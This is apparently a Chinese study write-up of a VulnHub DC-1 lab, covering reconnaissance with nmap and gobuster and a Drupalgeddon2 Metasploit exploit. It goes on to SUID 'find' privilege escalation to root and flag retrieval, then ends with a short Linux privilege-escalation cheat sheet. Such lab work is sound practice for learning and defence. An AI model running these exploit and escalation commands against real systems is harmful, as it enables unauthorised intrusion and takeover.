# DC-1 靶机渗透学习总结（2026.05.26）

## 一、任务目标
- 从零开始部署 VulnHub DC-1 靶机
- 实践信息收集、漏洞利用、提权、获取 Flag 的完整渗透流程
- 巩固 Linux 提权知识（SUID、计划任务等）

## 二、环境准备
- **靶机**：DC-1（VulnHub）
- **攻击机**：Kali Linux（IP 192.168.129.129）
- **网络模式**：NAT（靶机 IP 192.168.129.130）

### 常见问题与解决
- **OVA 导入失败**：VMware 报错 `Exception 0xc0000094` → 通过“更改硬件兼容性”为 Workstation 16.2.x 解决。
- **无法扫描到靶机**：网络模式不一致 → 将 Kali 和 DC-1 都设置为 NAT 模式，并重启 VMware NAT 服务。

## 三、信息收集（阶段一）

### 1. 主机发现与端口扫描
```bash
sudo nmap -sn 192.168.129.0/24        # 发现靶机 IP 192.168.129.130
sudo nmap -sV -p 22,80,443,8080 192.168.129.130
```

**结果**：

- 22/tcp open OpenSSH 6.0p1 Debian 4+deb7u7

- 80/tcp open Apache httpd 2.2.22 (Debian)

  ![image-20260526202213657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526202213657.png)

### 2. Web 服务识别

访问 `http://192.168.129.130`，页面源码中显示：

html

```
<meta name="Generator" content="Drupal 7 (http://drupal.org)">
```

![image-20260526203324806](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526203324806.png)

确认 CMS 为 **Drupal 7**。

### 3. 目录扫描（使用 gobuster）

bash

```
gobuster dir -u http://192.168.129.130 -w /usr/share/wordlists/dirb/common.txt -t 50
```

![image-20260526204233278](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526204233278.png)

发现 /admin、robots.txt

## 四、漏洞利用（阶段二）

### 利用 Drupalgeddon2（CVE-2018-7600）获得初始 Shell

#### 方法一：Metasploit（推荐）

bash

```
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.129.130
set RPORT 80
set TARGETURI /
run
```

![image-20260526212714582](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212714582.png)

成功获得 meterpreter 会话，然后进入 shell：

bash

```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

![image-20260526212737818](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212737818.png)

> 

## 五、信息收集（低权限 Shell）

在 `www-data` 用户下执行：

bash

```
whoami          # www-data
id              # uid=33(www-data) gid=33(www-data)
uname -a        # Linux DC-1 3.2.0-6-486
cat /etc/os-release   # Debian 7 (wheezy)
find / -perm -4000 -type f 2>/dev/null   # 列出 SUID 文件
```

![image-20260526212855325](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212855325.png)

**关键发现**：`/usr/bin/find` 具有 SUID 权限，可用于提权。

## 六、提权至 root（阶段三）

利用 SUID 的 `find` 命令：

bash

```
cd /tmp
find . -exec /bin/sh \; -quit
```

![image-20260526212932376](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212932376.png)

执行后提示符变为 `#`，确认提权成功：

bash

```
whoami   # root
id       # euid=0(root)
```

![image-20260526213002657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213002657.png)

## 七、获取 Flag

DC-1 共有 5 个 flag，本次成功获取以下 3 个：

| Flag 文件                | 内容摘要                                                     |
| :----------------------- | :----------------------------------------------------------- |
| `/var/www/flag1.txt`     | `Every good CMS needs a config file - and so do you.`        |
| `/home/flag4/flag4.txt`  | `Can you use this same method to find or access the flag in root?` |
| `/root/thefinalflag.txt` | `Well done!!!! ... @DCAU7`                                   |

> **说明**：flag2 和 flag3 未在本次任务中定位，可能位于数据库或需要额外交互。建议后续补充完整。
>
> ![image-20260526213120893](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213120893.png)

## 八、今日练习完成清单

- 下载并导入 DC-1 靶机，解决 VMware 兼容性问题
- 使用 nmap 发现靶机并扫描端口服务
- 识别 Drupal 7 版本
- 利用 Drupalgeddon2 获得 www-data shell
- 执行信息收集命令，发现 SUID find
- 利用 find 提权至 root
- 读取 3 个 flag 文件

## 九、学习要点总结

1. **虚拟机网络配置**：确保靶机与攻击机处于同一虚拟网络（NAT / 桥接），否则无法扫描。
2. **信息收集的重要性**：通过 `nmap` 和 `gobuster` 发现服务版本和隐藏路径，为漏洞利用提供依据。
3. **漏洞利用工具选择**：Metasploit 模块稳定可靠；手动脚本适合理解细节。
4. **SUID 提权**：`find` 是最常见的可利用 SUID 命令之一，`-exec` 可执行任意命令。
5. **Flag 存储位置**：DC-1 的 flag 分布在 `/var/www`、`/home/flag4`、`/root`，以及可能的数据库或用户目录。



```
## Linux 提权速查（2026.05.27）

### 1. SUID 提权
- 查找：`find / -perm -4000 -type f 2>/dev/null`
- 利用（如 find）：`find . -exec /bin/sh \; -quit`

### 2. Sudo 提权
- 查看权限：`sudo -l`
- 利用（如 find）：`sudo find . -exec /bin/sh \; -quit`

### 3. Cron 提权
- 查看计划任务：`cat /etc/crontab` 或 `ls -la /etc/cron*`
- 如果脚本可写，插入反弹 shell。
```